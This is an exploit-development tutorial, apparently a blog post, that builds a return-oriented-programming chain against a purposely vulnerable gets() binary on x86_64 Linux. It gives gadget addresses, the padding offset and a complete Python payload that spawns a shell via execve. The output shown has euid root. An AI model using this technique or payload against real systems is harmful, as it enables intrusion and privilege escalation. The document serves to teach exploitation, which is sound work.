Tools:
1. objdump
2. ROPgadget

Binary protection:
1. Read Only relocations
2. No exec stack
3. No exec heap
4. ASLR

Compilation: Static

Architecture: x86_64

Operating System: Linux (Debian)

#1. Vulnerable binary
For this exemple, I will take a very simple code.
<pre><code class="cpp">#include &lt;stdio.h&gt;

// gcc main.c -fno-stack-protector -Wl,-z,relro,-z,now,-z,noexecstack -static
int main()
{
  char buf[64];

  gets(buf);  // Never use this this function !
  printf("%s", buf);
  return 0;
}
</code></pre>
Like you can see, the vulnerability is near the gets function. As the gets function does not control the size of the input data, we will easily can pass an exploit thanks to the ROP method.

#2. To begin
Our goal is to get a shell. For this, I choose to use the execve syscall.

For remind: 
int execve(const char *filename, char *const argv[], char *const envp[]);  RAX = 59

So we will have:
RDI = "/bin//sh"
RSI = NULL
RDX = NULL
RAX = 59

#3. Payload construction
To construct our payload, we will first need to set RSI (the filename arg of execve) to the string "/bin//sh". (double slash because of 64 bits architecture)
We will use the @data section to store our string. To get the data section address we will use objdump:
<pre><code class="bash">$ objdump -D a.out | grep data
...
Disassembly of section .data:
00000000006b4000 &lt;__data_start&gt;:
...
</code></pre>
Ok, now we need the gadget to set RDI register.

We will need the following gadget:
pop rdi, to set RSI address point to the data section.
pop rsi, to store tempararily the data section address. (because the binary does not contain "mov qword ptr [rdi], rax ; ret" gadget)
pop rax, to store temporarily the string "/bin//sh".
mov QWORD PTR [rsi], rax, to move the string to the address pointed by rsi. (the data section address)

Thanks to ROPgadget, it's very easy to locate the gadget:
<pre><code class="bash">$ ROPgadget --binary a.out| egrep 'pop rsi ; ret|pop rax ; ret|mov qword ptr \[rsi\], rax ; ret|pop rdi ; ret'
...
0x000000000045f491 : mov qword ptr [rsi], rax ; ret
0x00000000004314ad : pop rax ; ret
0x00000000004016b7 : pop rsi ; ret
0x000000000040159b : pop rdi ; ret
...</code></pre>
After multiple test, I found 72 of padding before rewrite RIP.
So our payload will begin like this:
<pre><code class="python">p = 'A'*72
p += pack('&lt;Q', 0x00000000004016b7) # pop rsi ; ret
p += pack('&lt;Q', 0x00000000006b4000) # adress of the data section
p += pack('&lt;Q', 0x00000000004314ad) # pop rax ; ret
p += '/bin//sh'
p += pack('&lt;Q', 0x000000000045f491) # mov qword ptr [rsi], rax ; ret
p += pack('&lt;Q', 0x000000000040159b) # pop rdi ; ret
p += pack('&lt;Q', 0x00000000006b4000) # adress of the data section</pre></code>

So now we just have to repeat this step for the next two arguments.
We will have:
<pre><code class="python">p += pack('&lt;Q', 0x0000000000432d49) # pop rdx ; pop rsi ; ret
p += pack('&lt;Q', 0x0000000000000000) # set rdx to NULL
p += pack('&lt;Q', 0x0000000000000000) # set rsi to NULL</code></pre>
The last step is to set RAX to 59 (the number of execve syscall) and call the "syscall" instruction.
<pre><code class="python">p += pack('&lt;Q', 0x00000000004314ad) # pop rax ; ret
p += pack('&lt;Q', 0x000000000000003b) # Set rax to 59
p += pack('&lt;Q', 0x0000000000454515) # syscall ; ret</code></pre>

#4. Exploitation
The whole payload:
<pre><code class="python">#!/usr/bin/env python2

from struct import pack

p = 'A'*72 # padding

p += pack('&lt;Q', 0x00000000004016b7) # pop rsi ; ret
p += pack('&lt;Q', 0x00000000006b4000) # address of data section
p += pack('&lt;Q', 0x00000000004314ad) # pop rax ; ret
p += '/bin//sh'
p += pack('&lt;Q', 0x000000000045f491) # mov qword ptr [rsi], rax ; ret

p += pack('&lt;Q', 0x000000000040159b) # pop rdi ; ret
p += pack('&lt;Q', 0x00000000006b4000) # address of data section
p += pack('&lt;Q', 0x0000000000432d49) # pop rdx ; pop rsi ; ret
p += pack('&lt;Q', 0x0000000000000000) # set rdx to 0
p += pack('&lt;Q', 0x0000000000000000) # set rsi to 0
p += pack('&lt;Q', 0x00000000004314ad) # pop rax ; ret
p += pack('&lt;Q', 0x000000000000003b) # Set rax to 59
p += pack('&lt;Q', 0x0000000000454515) # syscall ; ret

print p</code></pre>

Now we test:
<pre><code class="bash">$ (python2 rop.py; cat) | ./a.out
id
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)</pre></code>
Done.
